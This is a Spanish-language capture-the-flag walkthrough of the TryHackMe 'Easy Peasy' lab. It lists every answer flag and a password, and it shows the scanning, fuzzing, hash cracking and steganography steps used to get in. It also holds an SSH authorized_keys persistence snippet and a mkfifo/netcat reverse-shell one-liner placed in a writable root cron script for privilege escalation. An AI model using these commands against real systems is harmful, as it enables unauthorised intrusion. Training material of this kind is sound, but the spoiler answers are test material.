# Easy Peasy

`Try Hack Me` `Linux` `Stego` `Crypto` `SSH`

## Flags

* **1a Flag:** `flag{f1rs7_fl4g}`
* **2a Flag:** `flag{1m_s3c0nd_fl4g}`
* **3a Flag:** `flag{9fdafbd64c47471a8f54cd3fc64cd312}`
* **User Flag:** `flag{n0wits33msn0rm4l}`
* **Root Flag:** `flag{63a9f0ea7bb98050796b649e85481845}`

## Users

* boring _\(pwd: `iconvertedmypasswordtobinary`\)_

## **Enumeración**

Vemos si el host esta levantado y identificamos el SSOO con `ping -c1 IP`

> Linux: TTL &lt;= 64
>
> Windows: TTL &gt;= 65 & &lt;= 128

![](https://i.imgur.com/FqEZqNg.png)

### Escaneo de puertos

Primero vemos si va muy lento el escaneo: `nmap -p- --open -T5 -v -n IP`

```text
-p-         Todos los puertos 
--open      Mostrar solos puertos abiertos 
-T5         Modo más agresivo 
-v          Modo verbose (reporta por pantalla) 
-n          No aplicar resolución DNS
```

Como va lento, lanzamos este otro comando: `nmap -sS --min-rate 5000 -p- -vvv -n -Pn IP`

```text
-sS           Realizar un TCP SYN port scan
--min-rate    Emitir al menos 5000 paquetes por segundo
-Pn           No realizar Host Discovery
```

Va más rápido y encuentra los puertos 80 \(HTTP\), 6498 y 65524.

![](https://i.imgur.com/96oueA2.png)

Obtenemos los servicios que corren en los puertos `nmap -sC -sV -p80,6498,65524 IP`

![](https://i.imgur.com/zw85K3A.png)

Vemos que son dos HTTP \(con un fichero robots.txt\) y un servicio SSH.

### Servicios HTTP

Lanzamos un whatweb sobre los dos servicios HTTP para ver si tiene algún CMS tipo Wordpress: `whatweb IP` y `whatweb IP:64524`

![](https://i.imgur.com/CaNxGRu.png)

Vemos que son un Nginx y Apache normales. Accedemos a los dos portales web y vemos las páginas por defecto de Nginx y Apache. En el código fuente no vemos nada.

Vamos a hacer un **fuzzing** en los dos portales para encontrar alguna ruta con **GoBuster**

```text
gobuster dir -u IP -w DICT -q -n -e
gobuster dir -u IP:65524 -w DICT -q -n -e
```

```text
-u        Target 
-w        Diccionario (/usr/share/wordlists/dirb/common.txt)
-q        Silencioso, no muestra mensajes de estado           
-n        No muestra códigos de estado        
-e        Muestra URLs completas
```

#### Nginx

En el servidor HTTP Nginx, vemos que tiene el robots.txt y un path oculto.

![](https://i.imgur.com/EXREax1.png)

{% hint style="info" %}
Tenemos un path oculto **`IP/hidden`**
{% endhint %}

En el robots.txt no vemos nada y en el path vemos una página

![](https://i.imgur.com/v4APY8F.jpg)

En la página y código fuente no vemos nada. Lanzamos un nuevo fuzz sobre el path. `gobuster dir -u IP/hidden -w DICT -q -n -e`

![](https://i.imgur.com/BipoOSs.png)

{% hint style="info" %}
Tenemos otro path oculto **`IP/hidden/whatever`**
{% endhint %}

![](https://i.imgur.com/uOqN6cm.png)

En el código fuente vemos un `<p>` oculto. Parece la flag en base64, la decodificamos

![](https://i.imgur.com/JEwkd9d.png)

{% hint style="success" %}
Tenemos la primera flag **`flag{f1rs7_fl4g}`**
{% endhint %}

#### Apache

En el servidor del puerto 65524 solo vemos el robots.txt

![](https://i.imgur.com/UDiiUzQ.png)

En el robots.txt vemos una especie de flag, pero no sigue el formato de las flags

![](https://i.imgur.com/Ro8Vf99.png)

### Cripto y stego

Probamos a crackearlo con algunas webs pero no funciona.

#### Crack the hash

{% hint style="danger" %}
**Truco** - Buscar el hash en google entre comillas con la palabra "flag"
{% endhint %}

![](https://i.imgur.com/z723Md9.png)

Encontramos una página donde está crackeado:

{% hint style="success" %}
Tenemos la segunda flag **`flag{1m_s3c0nd_fl4g}`**
{% endhint %}

Nos falta la tercera flag y sabemos que necesitamos un hash para crackearlo con el wordlist que nos da TryHackMe.

Volvemos a revisar la página por defecto de Apache \(**`IP:65525`**\).

Encontramos la flag:

![](https://i.imgur.com/exhQOru.png)

{% hint style="success" %}
Tenemos la tercera flag **`flag{9fdafbd64c47471a8f54cd3fc64cd312}`**
{% endhint %}

#### Encoding

Buscamos un path oculto. Volvemos a mirar el código fuente de la página de Apache.

{% hint style="danger" %}
**Truco** - Buscar en el código fuente de las páginas **`hidden`** y **`flag`**

![](https://i.imgur.com/eXbo6dq.png)
{% endhint %}

Tenemos el path codificado, pero no sabemos en que. Probamos en CyberChef y vemos que es Base62

![](https://i.imgur.com/TQglEDK.png)

{% hint style="info" %}
Tenemos un path **`/n0th1ng3ls3m4tt3r`**
{% endhint %}

En la página no vemos nada, pero en el código fuente encontramos un hash.

![](https://i.imgur.com/SqfW0Re.png)

#### John

Probamos a crackearlo con la wordlist que nos dan con john.

```text
/usr/sbin/john --wordlist=easypeasy.txt hash
```

![](https://i.imgur.com/5BpXcsw.png)

{% hint style="warning" %}
Tenemos una password **`mypasswordforthatjob`**
{% endhint %}

#### Steghide

Descargamos la imagen encontrada en el path oculot y la pasamos por steghide. Probamos con la password encontrada.

![](https://i.imgur.com/rSASjlg.png)

{% hint style="warning" %}
Tenemos un usuario **`boring`**
{% endhint %}

#### Binary

Pasamos la password por cyberchef porque estan en binario.

![](https://i.imgur.com/ybKKV4i.png)

{% hint style="warning" %}
Tenemos la password de **boring** **`iconvertedmypasswordtobinary`**
{% endhint %}

## **Getting a shell**

Tenemos ya un usuario/password, por lo que conectamos por SSH:

![](https://i.imgur.com/CLWRura.png)

{% hint style="danger" %}
Podemos tener acceso sin contraseña copiando nuestra Clave Pública SSH

```bash
#ON MACHINE
cd
mkdir -p ~/.ssh
echo "[MY LOCAL ~/.ssh/id_rsa.pub]" >> ~/.ssh/authorized_keys

#ON KALI
ssh -i ~/.ssh/id_rsa USER@IP
```
{% endhint %}

### **User Flag**

En el directorio de joker vemos la **user.txt** flag, pero parece codificada con ROT `synt{a0jvgf33zfa0ez4y}`. La pasamos por CyberChef.

{% hint style="success" %}
USER FLAG: **`flag{n0wits33msn0rm4l}`**
{% endhint %}

## **Privilege Escalation**

Vamos a intentar una escalada de privilegios en Linux siguiendo este [tutorial](https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4):

{% embed url="https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4" caption="" %}

También podemos lanzar este [script ](https://github.com/rebootuser/LinEnum)para enumerar el sistema:

{% file src="../../.gitbook/assets/linenum.sh" caption="Linux Enumeration Script" %}

### Sudo and SUID files

En primer lugar, intentamos ver los privilegios de sudo del usuario boring. No puede ejecutar el comando `sudo -l`.

Buscamos los ficheros con el SUID activo.

```text
find / -user root -perm -4000 2>/dev/null
```

![](https://i.imgur.com/rJBLUw6.png)

Buscamos alguno que nos llame la atención de esta guía pero no encontramos nada:

{% embed url="https://gtfobins.github.io/" caption="" %}

### Capabilities

Probamos a listar las capabilities de Linux. Usamos esta guía:

Ejecutamos `getcap -r / 2>/dev/null`

![](https://i.imgur.com/vjjUamM.png)

No vemos nada interesante

### Cronjob

Lanzamos el script de enumeración de Linux anterior y exportamos el resultado a nuestra máquina. Lo revisamos y encontramos una tarea cron interesante:

![](https://i.imgur.com/z1EU7ey.png)

Vemos que de forma programada, cada minuto se ejecuta un script **`/var/www/.mysecretcronjob.sh`**. Accedemos a la ruta y vemos que podemos modificarlo. El script esta vacío.

![](https://i.imgur.com/XKpqOOB.png)

Lo modificamos para que lanze una shell reversa a nuestra máquina:

```text
#En nuestra máquina
nc -lvp 8888

#En el fichero .mysecretcronjob.sh de la máquina
rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc IP 8888 > /tmp/f
```

### **Root Flag**

Hemos escalado privilegios. Vamos al directorio **`/root`** a por la **root.txt** flag, aunque esta oculta como **`.root.txt`**.

![](https://i.imgur.com/uYTX2EN.png)

{% hint style="success" %}
ROOT FLAG: **`flag{63a9f0ea7bb98050796b649e85481845}`**
{% endhint %}

